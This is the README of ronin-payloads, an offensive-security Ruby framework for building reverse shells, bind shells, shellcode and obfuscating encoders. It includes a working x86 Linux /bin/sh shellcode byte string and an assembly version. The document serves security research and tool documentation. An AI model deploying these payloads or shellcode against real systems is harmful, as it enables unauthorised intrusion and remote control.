# ronin-payloads

[![CI](https://github.com/ronin-rb/ronin-payloads/actions/workflows/ruby.yml/badge.svg)](https://github.com/ronin-rb/ronin-payloads/actions/workflows/ruby.yml)
[![Code Climate](https://codeclimate.com/github/ronin-rb/ronin-payloads.svg)](https://codeclimate.com/github/ronin-rb/ronin-payloads)
[![Gem Version](https://badge.fury.io/rb/ronin-payloads.svg)](https://badge.fury.io/rb/ronin-payloads)

* [Website](https://ronin-rb.dev/)
* [Source](https://github.com/ronin-rb/ronin-payloads)
* [Issues](https://github.com/ronin-rb/ronin-payloads/issues)
* [Documentation](https://ronin-rb.dev/docs/ronin-payloads/frames)
* [Discord](https://discord.gg/6WAb3PsVX9) |
  [Mastodon](https://infosec.exchange/@ronin_rb)

## Description

ronin-payloads is a Ruby micro-framework for writing and running exploit
payloads. ronin-payloads allows one to write payloads as plain old Ruby classes.
ronin-payloads can be distributed as Ruby files or in git repositories that can
be installed with [ronin-repos].

**tl;dr** It's like `msfvenom` but simpler and more modular.

ronin-payloads is part of the [ronin-rb] project, a [Ruby] toolkit for security
research and development.

## Features

* Provides a succinct syntax and API for writing payloads in as few lines as
  possible.
* Supports defining Payloads as plain old Ruby classes.
* Provides base classes for a variety of languages and payload types
  (ASM, Shellcode, C, Go, Rust, Java, Groovy, JSP, Perl, PHP, Python, Ruby,
  NodeJS, Nashorn, Shell, PowerShell, SQL, XML, HTML, URL).
* Supports cross compiling C payloads to different architectures and OSes.
* Provides built-in common payloads:
  * Command-line reverse shells:
    * Awk
    * Bash
    * Lua
    * NodeJS
    * OpenSSL
    * Perl
    * PHP
    * PowerShell
    * Python
    * Ruby
    * Zsh
  * Java
    * Reverse shell
  * JavaScript
    * Node.js
      * Reverse shell
    * Nashorn
      * Reverse shell
  * Groovy
    * Reverse shell
  * PHP
    * Command exec.
  * Shellcode:
    * `execve(/bin/sh)`:
      * Linux (ARM, MIPS, PPC, x86, x86-64)
      * FreeBSD (x86, x86-64)
      * macOS (x86-64)
      * NetBSD (x86)
      * OpenBSD (x86)
    * bind shell:
      * Linux (ARM, MIPS, x86, x86-64)
      * FreeBSD (x86)
      * OpenBSD (x86)
    * reverse shell:
      * Linux (ARM, MIPS, PPC, x86, x86-64)
      * macOS (x86-64)
      * FreeBSD (x86)
      * NetBSD (x86)
  * C payloads:
    * reverse shell:
      * Windows (x86-64 and i686)
      * UNIX (Linux, FreeBSD, OpenBSD, NetBSD, macOS)
* Supports adding additional encoders to payloads for further obfuscation.
* Integrates with the [Ronin Post-Exploitation][ronin-post_ex] library.
* Provides a simple CLI for building, encoding, launching, and generating new
  payloads.
* Has 86% documentation coverage.
* Has 99% test coverage.

## Anti-Features

* No magic: exploits are defined as classes in files.
* No global state that could cause memory leaks.
* Not a big bulky framework, just a library.
* Not a central repository. Additional [ronin-payloads] can be hosted in other
  git repositories. This prevents censorship of offensive security tools.

## Synopsis

```
Usage: ronin-payloads [options] [COMMAND [ARGS...]]

Options:
    -h, --help                       Print help information

Arguments:
    [COMMAND]                        The command name to run
    [ARGS ...]                       Additional arguments for the command

Commands:
    build
    completion
    encode
    encoder
    encoders
    help
    irb
    launch
    list, ls
    new
    show, info
```

List available payloads:

```shell
$ ronin-payloads list
  bin/unix/reverse_shell
  bin/windows/reverse_shell
  command/awk/reverse_shell
  command/bash/reverse_shell
  command/lua/reverse_shell
  command/netcat/bind_shell
  command/node/reverse_shell
  command/openssl/reverse_shell
  command/perl/reverse_shell
  command/php/reverse_shell
  command/ping
  command/powershell/reverse_shell
  command/python/reverse_shell
  command/ruby/reverse_shell
  command/sleep
  command/touch
  command/windows/download
  command/windows/ping
  command/windows/touch
  command/zsh/reverse_shell
  groovy/reverse_shell
  java/reverse_shell
  js/nashorn/reverse_shell
  js/node/reverse_shell
  php/cmd_exec
  php/download_exec
  shellcode/freebsd/x86/bind_shell
  shellcode/freebsd/x86/exec_shell
  shellcode/freebsd/x86/reverse_shell
  shellcode/freebsd/x86_64/exec_shell
  shellcode/linux/arm/bind_shell
  shellcode/linux/arm/exec_shell
  shellcode/linux/arm/reverse_shell
  shellcode/linux/mips/bind_shell
  shellcode/linux/mips/exec_shell
  shellcode/linux/mips/reverse_shell
  shellcode/linux/ppc/exec_shell
  shellcode/linux/ppc/reverse_shell
  shellcode/linux/x86/bind_shell
  shellcode/linux/x86/exec_shell
  shellcode/linux/x86/reverse_shell
  shellcode/linux/x86_64/bind_shell
  shellcode/linux/x86_64/exec_shell
  shellcode/linux/x86_64/reverse_shell
  shellcode/macos/x86_64/exec_shell
  shellcode/macos/x86_64/reverse_shell
  shellcode/netbsd/x86/exec_shell
  shellcode/netbsd/x86/reverse_shell
  shellcode/openbsd/x86/bind_shell
  shellcode/openbsd/x86/exec_shell
  shellcode/windows/x86_64/cmd
  test/cmd
  test/js
  test/open_redirect
  test/perl
  test/php
  test/powershell
  test/python
  test/ruby
  test/sql
  test/url
  test/xss
```

Install a 3rd-party repository of payloads:

```shell
$ ronin-repos install https://github.com/user/payloads.git
```

Print additional information about a specific payload:

```shell
$ ronin-payloads show NAME
```

List available payload encoders:

```shell
$ ronin-payloads encoders
  html/encode
  js/base64_encode
  js/hex_encode
  js/node/base64_encode
  powershell/hex_encode
  shell/base64_encode
  shell/hex_encode
  shell/hex_escape
  shell/ifs
  sql/hex_encode
  xml/encode
```

Print additional information about a specific encoder:

```shell
$ ronin-payloads encoder NAME
```

Build and output a payload:

```shell
$ ronin-payloads build NAME
```

Load a payload from a file, then build and output it:

```shell
$ ronin-payloads build -f FILE NAME
```

Generate a boilerplate payload file, with some custom information:

```shell
$ ronin-payloads new example_payload.rb \
                      --name Example --arch i686 --os Linux \
                      --authors Postmodern --description "This is an example."
```

Generate a ronin repository of your own payloads (or exploits):

```shell
$ ronin-repos new my-repo
$ cd my-repo/
$ mkdir payloads
$ ronin-payloads new payloads/my_payload.rb \
                      --name MyPayload --arch i686 --os Linux \
                      --authors You --description "This is my payload."
$ vim payloads/my_payload.rb
$ git add payloads/my_payload.rb
$ git commit
$ git push
```

## Examples

Define a `/bin/sh` shellcode payload:

```ruby
# encoding: ASCII-8BIT
require 'ronin/payloads/shellcode_payload'

module Ronin
  module Payloads
    class LinuxX86BinSh < ShellcodePayload

      register 'shellcode/linux/x86/bin_sh'

      summary 'x86 Linux /bin/sh shellcode'
      description <<~EOS
        Shellcode that spawns a local /bin/sh shell
      EOS

      arch :x86
      os :linux

      def build
        @payload = "1\xc0Ph//shh/bin\x89\xdcPS\x89\xcc1\xd2\xcd\x0b"
      end
    end
  end
end
```

Define a `/bin/sh` shellcode payload in pure-Ruby:

```ruby
require 'ronin/payloads/shellcode_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module X86
          class BinSh < ShellcodePayload

            register 'shellcode/linux/x86/bin_sh'
            description <<~DESC
              Shellcode that spawns a local /bin/sh shell
            DESC

            arch :x86
            os :linux

            def build
              shellcode do
                xor   eax, eax
                push  eax
                push  0x68732f2f
                push  0x6e69622f
                mov   esp, ebx
                push  eax
                push  ebx
                mov   esp, ecx
                xor   edx, edx
                int   0xb
              end
            end

          end
        end
      end
    end
  end
end
```

Define a payload encoder class:

```ruby
require 'ronin/encoders/encoder'

module Ronin
  module Payloads
    module Encoders
      module Text
        class Base64 < Ronin::Encoders::Encoder

          register 'text/base64'

          description <<~DESC
            Example base64 payload encoder
          DESC

          arch :x86
          os   :linux

          def encode(data)
            data.to_s.base64_encode
          end

        end
      end
    end
  end
end
```

## Requirements

* [Ruby] >= 3.0.0
* [ronin-support] ~> 1.0
* [ronin-code-asm] ~> 1.0
* [ronin-post_ex] ~> 0.1
* [ronin-core] ~> 0.2
* [ronin-repos] ~> 0.1

## Install

```shell
$ gem install ronin-payloads
```

### Gemfile

```ruby
gem 'ronin-payloads', '~> 0.1'
```

### gemspec

```ruby
gem.add_dependency 'ronin-payloads', '~> 0.1'
```

## Development

1. [Fork It!](https://github.com/ronin-rb/ronin-payloads/fork)
2. Clone It!
3. `cd ronin-payloads/`
4. `./scripts/setup`
5. `git checkout -b my_feature`
6. Code It!
7. `bundle exec rake spec`
8. `git push origin my_feature`

## Disclaimer

ronin-payloads only contains basic or generic exploit payloads that can be
easily found online or in other Open Source security tools. ronin-payloads
**does not** contain by default any weaponized payloads. These payloads are
themselves not harmful without an exploit to deliver them. Therefor,
ronin-payloads **must not** and **should not** be considered to be
malicious software (malware) or malicious in nature.

## License

Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)

ronin-payloads is free software: you can redistribute it and/or modify
it under the terms of the GNU Lesser General Public License as published
by the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

ronin-payloads is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Lesser General Public License for more details.

You should have received a copy of the GNU Lesser General Public License
along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.

[Ruby]: https://www.ruby-lang.org
[ronin-rb]: https://ronin-rb.dev

[ronin-support]: https://github.com/ronin-rb/ronin-support#readme
[ronin-code-asm]: https://github.com/ronin-rb/ronin-code-asm#readme
[ronin-core]: https://github.com/ronin-rb/ronin-core#readme
[ronin-repos]: https://github.com/ronin-rb/ronin-repos#readme
[ronin-post_ex]: https://github.com/ronin-rb/ronin-post_ex#readme
